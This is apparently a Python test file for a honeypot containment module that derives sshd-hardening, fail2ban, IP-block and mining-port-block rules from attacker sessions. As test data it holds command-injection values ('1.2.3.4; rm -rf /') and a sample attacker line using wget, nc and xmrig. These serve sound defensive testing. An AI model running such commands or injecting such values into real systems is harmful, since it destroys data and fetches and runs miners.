"""Tests for brain.containment.rules."""

from __future__ import annotations

import random

from hypothesis import given
from hypothesis import strategies as st

from brain.containment.rules import (
    SessionForContainment,
    build_rules,
    extract_mining_ports,
)
from brain.containment.validate import validate_ip
from brain.models import Severity


def _s(
    sid: str,
    ip: str = "203.0.113.5",
    sev: Severity = Severity.CLASS_1,
    ok: bool = False,
    failed: int = 0,
    ports: frozenset[int] = frozenset(),
) -> SessionForContainment:
    return SessionForContainment(sid, ip, sev, ok, failed, ports)


def test_empty_input_gives_no_rules() -> None:
    assert build_rules([]) == []


def test_all_rule_kinds_with_exact_evidence() -> None:
    sessions = [
        _s("b", sev=Severity.CLASS_5, ok=True, failed=2, ports=frozenset({3333})),
        _s("a", sev=Severity.CLASS_3, ok=True),
        _s("c", ip="198.51.100.1", failed=1),
    ]
    rules = {r.id: r for r in build_rules(sessions)}
    assert rules["sshd-hardening"].evidence_sessions == ("a", "b")
    assert rules["fail2ban-sshd"].evidence_sessions == ("b",)
    assert rules["block-ip-203.0.113.5"].evidence_sessions == ("a", "b")
    assert "block-ip-198.51.100.1" not in rules
    assert rules["block-mining-port-3333"].evidence_sessions == ("b",)
    assert all(r.title and r.description for r in rules.values())


def test_invalid_ip_omitted() -> None:
    rules = build_rules([_s("a", ip="1.2.3.4; rm -rf /", sev=Severity.CLASS_5)])
    assert rules == []


def test_extract_mining_ports() -> None:
    text = "wget http://x.example:4444/a; nc 10.0.0.1:80 ; xmrig -o pool:3333 host:99999"
    assert extract_mining_ports(text) == frozenset({4444, 3333})


_IPS = st.sampled_from(
    ["203.0.113.5", "198.51.100.1", "192.0.2.7", "2001:db8::1", "bad ip; rm -rf /", ""]
)

_sessions_strategy = st.lists(
    st.builds(
        SessionForContainment,
        session_id=st.text(alphabet="abcdef0123456789", min_size=1, max_size=6),
        src_ip=_IPS,
        severity=st.sampled_from(list(Severity)),
        had_successful_login=st.booleans(),
        failed_login_count=st.integers(0, 5),
        mining_ports=st.frozensets(
            st.sampled_from([3333, 4444, 5555, 7777, 14444, 45700, 80, 22, 0, 70000]),
            max_size=4,
        ),
    ),
    max_size=10,
    unique_by=lambda s: s.session_id,
)

_MINING = {3333, 4444, 5555, 7777, 14444, 45700}


@given(_sessions_strategy)
def test_property_16_rule_evidence_exact(
    sessions: list[SessionForContainment],
) -> None:
    """Property 16: evidence is exactly correct per rule kind.

    **Validates: Requirements 7.1, 7.2, 7.3, 7.4, 7.5, 7.6**
    """
    rules = build_rules(sessions)
    by_id = {r.id: r for r in rules}
    assert len(by_id) == len(rules)

    expected: dict[str, tuple[str, ...]] = {}
    ok = sorted(s.session_id for s in sessions if s.had_successful_login)
    if ok:
        expected["sshd-hardening"] = tuple(ok)
    failed = sorted(s.session_id for s in sessions if s.failed_login_count >= 2)
    if failed:
        expected["fail2ban-sshd"] = tuple(failed)
    ip_ev: dict[str, list[str]] = {}
    for s in sessions:
        if s.severity in (Severity.CLASS_3, Severity.CLASS_5) and validate_ip(s.src_ip):
            ip_ev.setdefault(s.src_ip, []).append(s.session_id)
    for ip, ids in ip_ev.items():
        expected["block-ip-" + ip.replace(":", "_")] = tuple(sorted(ids))
    for port in _MINING:
        ids = sorted(s.session_id for s in sessions if port in s.mining_ports)
        if ids:
            expected[f"block-mining-port-{port}"] = tuple(ids)

    assert {i: r.evidence_sessions for i, r in by_id.items()} == expected
    for r in rules:
        assert r.evidence_sessions
        assert r.title.strip()
        assert r.description.strip()


@given(_sessions_strategy, st.randoms(use_true_random=False))
def test_property_17_build_rules_deterministic(
    sessions: list[SessionForContainment], rnd: random.Random
) -> None:
    """Property 17: build_rules is deterministic and input-order independent.

    **Validates: Requirements 7.11**
    """
    first = build_rules(sessions)
    assert build_rules(sessions) == first
    shuffled = list(sessions)
    rnd.shuffle(shuffled)
    assert build_rules(shuffled) == first
